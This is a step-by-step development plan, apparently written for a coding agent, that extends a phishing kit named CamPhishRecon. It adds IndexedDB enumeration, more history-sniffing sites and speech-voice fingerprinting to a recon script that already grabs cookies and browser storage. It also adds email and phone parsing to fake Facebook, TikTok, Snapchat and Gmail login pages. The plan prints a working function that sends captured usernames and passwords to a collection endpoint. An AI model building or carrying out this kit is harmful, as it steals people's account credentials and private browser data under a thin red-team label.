# Plan 006: Feature Parity — recon.js + Social Templates

> **Executor instructions**: Follow step by step. Run every verification
> command before moving to the next step.
>
> **Drift check**: `git diff --stat 68a5f01..HEAD -- templates/recon.js templates/instagram.html templates/facebook.html templates/tiktok.html templates/snapchat.html templates/gmail.html`\
> If any file changed, compare excerpts before proceeding.

## Status

- **Priority**: P2
- **Effort**: M
- **Risk**: LOW
- **Depends on**: none
- **Category**: bug
- **Planned at**: commit `68a5f01`, 2026-06-21

## Why this matters

Four feature gaps between what the docs claim and what the code implements:
1. **RED-TEAM-PLAYBOOK.md says IndexedDB enumeration** (line 57) but `recon.js` doesn't capture it.
2. **RED-TEAM-PLAYBOOK.md says 12 sites for history detection** (line 62) but `recon.js` only checks 9.
3. **Schema has `voice_count` column** (migrations/001_init.sql:77) but `recon.js` never captures speech synthesis voices.
4. **Email/phone auto-detection** from username field only works on Instagram template — other social login templates don't parse the username field for email/phone patterns.

## Current state

```javascript
// templates/recon.js:380-409 — StorageGrabber.grab()
// Captures cookies, localStorage, sessionStorage. No IndexedDB.

// templates/recon.js:413-423 — HistoryDetect.sites
// Only 9 sites defined (missing: ebay, coinbase, stackoverflow)
// Claimed in playbook: 12 sites

// Schema has voice_count column but no capture:
// backend/migrations/001_init.sql:77 — voice_count INTEGER
// recon.js has no capture for window.speechSynthesis.getVoices()

// Instagram has email/phone detection (instagram.html:103-104):
if(u.value.indexOf("@")>=0)data.email=u.value;
if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
// But facebook, tiktok, snapchat, gmail don't have this
```

## Commands you will need

| Purpose | Command | Expected |
|---------|---------|----------|
| Validate JS | `node -e "eval(require('fs').readFileSync('templates/recon.js','utf8').replace('API_BASE_URL','/api').replace('forwarding_link',''))" 2>&1` | no errors (note: will fail on browser APIs but should parse) |

## Scope

**In scope**:
- `templates/recon.js` — add IndexedDB enumeration, add missing 3 sites, add speech synthesis voice count
- `templates/instagram.html` — already has email/phone detection
- `templates/facebook.html` — add email/phone detection
- `templates/tiktok.html` — add email/phone detection
- `templates/snapchat.html` — add email/phone detection
- `templates/gmail.html` — add email/phone detection

**Out of scope**:
- Other templates not listed
- Backend/frontend changes
- WhatsApp template (no login form)

## Git workflow

- Branch: `plan/006-feature-parity`
- Commits: `feat(recon): add IndexedDB enumeration`, `feat(recon): add missing 3 history-detection sites`, `feat(recon): add speech synthesis voice count`, `feat(templates): add email/phone detection to social login templates`

## Steps

### Step 1: Add IndexedDB enumeration to recon.js

In `templates/recon.js`, add a new method to the `StorageGrabber` object (after line 409):

```javascript
// ============ INDEXED DB ENUMERATION ============
var IndexedDBGrabber = {
  grab: function(callback) {
    if (!window.indexedDB || !window.indexedDB.databases) {
      if (callback) callback([]);
      return;
    }
    window.indexedDB.databases().then(function(dbs) {
      var result = dbs.map(function(db) {
        return {name: db.name, version: db.version};
      });
      if (callback) callback(result);
    }).catch(function() {
      if (callback) callback([]);
    });
  }
};
```

Then integrate into `Recon.init()` (around line 507):
```javascript
// IndexedDB enumeration
IndexedDBGrabber.grab(function(dbs) {
  if (dbs && dbs.length > 0) {
    Capture.event('indexeddb_detected', {databases: dbs});
  }
});
```

Also expose on the Recon object:
```javascript
window.CamPhishRecon = Recon; // line 549
// After this line:
Recon.IndexedDBGrabber = IndexedDBGrabber;
```

**Verify**: No syntax errors. `grep -n "IndexedDBGrabber" templates/recon.js` → 4 matches (definition, init call, export, comment)

### Step 2: Add missing 3 history detection sites

In `templates/recon.js`, add to the `HistoryDetect.sites` array (around line 413-423):

```javascript
// Add after the github entry (line 422):
{url:'https://www.ebay.com/favicon.ico',cat:'shopping'},
{url:'https://www.coinbase.com/favicon.ico',cat:'crypto'},
{url:'https://stackoverflow.com/favicon.ico',cat:'dev'},
```

**Verify**: `grep -c "favicon.ico" templates/recon.js` → 12 (was 9, now 12, matching the playbook)

### Step 3: Add speech synthesis voice count to fingerprint

In `templates/recon.js`, inside the `Fingerprint.collect` function (after the platform check around line 159), add:

```javascript
if (window.speechSynthesis) {
  try {
    var voices = window.speechSynthesis.getVoices();
    if (voices && voices.length > 0) {
      fp.voice_count = voices.length;
      fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
    }
  } catch(e) {}
  // Chrome loads voices asynchronously — listen for the event
  window.speechSynthesis.onvoiceschanged = function() {
    try {
      var voices = window.speechSynthesis.getVoices();
      fp.voice_count = voices.length;
      fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
    } catch(e) {}
  };
}
```

**Verify**: `grep -n "voice_count" templates/recon.js` → 1 match

### Step 4: Add email/phone detection to social login templates

For each template (`facebook.html`, `tiktok.html`, `snapchat.html`, `gmail.html`), find the credential capture function and add email/phone detection.

The pattern from `instagram.html` (lines 99-108):
```javascript
function captureCreds(){
  var u=document.getElementById("user");var p=document.getElementById("pass");
  if(!u||!p)return;
  var data={template_id:"facebook",username:u.value,password:p.value};
  if(u.value.indexOf("@")>=0)data.email=u.value;
  if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
  fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
    method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
  }).catch(function(){});
}
```

For each social login template:
1. Read the template's existing credential capture function
2. Add email/phone detection logic
3. Ensure the function is called on form submission

Each template has different field IDs — adapt accordingly:

| Template | File | Username field ID | Password field ID | Function name |
|----------|------|-------------------|-------------------|---------------|
| Facebook | `facebook.html:87` | `#user` | `#pass` | inline in fetch |
| TikTok | `tiktok.html:104` | `#user` | `#pass` | inline in fetch |
| Snapchat | `snapchat.html:86` | `#user` | `#pass` | inline in fetch |
| Gmail | `gmail.html:89` | `#user` | `#pass` | inline in fetch |

For each, read the file first to confirm field IDs, then add the detection logic to the `data` object before POST.

**Verify**: No syntax errors in any template. `grep -n "data.email" templates/facebook.html templates/tiktok.html templates/snapchat.html templates/gmail.html` → 4 matches

## Test plan

- Manual: Load recon.js in browser → check `IndexedDBGrabber.grab()` in console → returns array (may be empty)
- Manual: Check the HistoryDetect.sites array has 12 entries
- Manual: Open each social login template → submit with email-format username → check /api/credentials shows `email` field populated
- Manual: Open each social login template → submit with phone-format username → check /api/credentials shows `phone` field populated

## Done criteria

- [ ] `templates/recon.js` parses without syntax errors (node check)
- [ ] IndexedDB enumeration is in recon.js and called from Recon.init()
- [ ] HistoryDetect has 12 sites (was 9)
- [ ] Fingerprint captures `voice_count` from speechSynthesis
- [ ] All 4 social templates (facebook, tiktok, snapchat, gmail) detect email/phone from username field
- [ ] `plans/README.md` status row updated

## STOP conditions

- `window.indexedDB.databases()` is not available in some browsers (Chrome 58+, Firefox 106+, Safari 17.5+ — check browser compat). If the app targets older browsers, wrap in feature detection (already handled with `if (!window.indexedDB.databases)`).
- SpeechSynthesis voices are loaded asynchronously in Chrome — the initial `getVoices()` may return empty. The `onvoiceschanged` event handles this.

## Maintenance notes

- IndexedDB enumeration is limited to databases accessible from the current origin — does not enumerate third-party databases.
- Voice count is a single-value snapshot — some devices have 0 voices available (headless, automated browsers).
- The email/phone detection regex (`/^\+?[0-9]{10,}/`) is intentionally loose — may catch numeric usernames that aren't phone numbers. This is acceptable for intelligence gathering.
